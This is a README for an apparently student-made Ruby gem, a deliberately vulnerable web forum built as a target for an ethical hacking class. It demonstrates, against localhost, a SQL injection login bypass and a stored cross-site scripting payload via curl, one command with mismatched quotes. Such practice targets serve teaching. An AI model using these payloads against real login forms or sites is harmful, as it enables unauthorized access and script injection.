# Vulnerable Forum

This is a vulnerable web forum to act as dummy application to be the punching bag for whilst doing my ethical hacking lab for class.

## Installation

    $ gem install vulnerable_forum

## Usage


#### SQL Injection 
SQL Inject the login form however you'd like, even at the command-line!:

```shell
> curl localhost:4567 --cookie "cookies.txt" --cookie-jar "cookies.txt"
Welcome to the forum!
Total Users: 1
Total Posts: 2

> curl -X POST localhost:4567/login \ 
    -d "username=' or ''='&password=' or ''='" \ 
    --cookie "cookies.txt" \ 
    --cookie-jar "cookies.txt"
Welcome back John!

> curl localhost:4567 --cookie "cookies.txt" --cookie-jar "cookies.txt"
Welcome to the forum, John!
Total Users: 1
Total Posts: 2
```

#### Stored Cross-Site Scripting
Stored XXS attacks are fun, huh?:

```shell
> curl -X POST localhost:4567/post \ 
  -d "title=Hacked&content=<script>alert("Hacked!")</script>' 
  --cookie "cookies.txt" \
  --cookie-jar "cookies.txt"
```

## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).

## Code of Conduct

Everyone interacting in the VulnerableForum project’s codebases, issue trackers, chat rooms and mailing lists is expected to follow the [code of conduct](https://github.com/[USERNAME]/vulnerable_forum/blob/master/CODE_OF_CONDUCT.md).
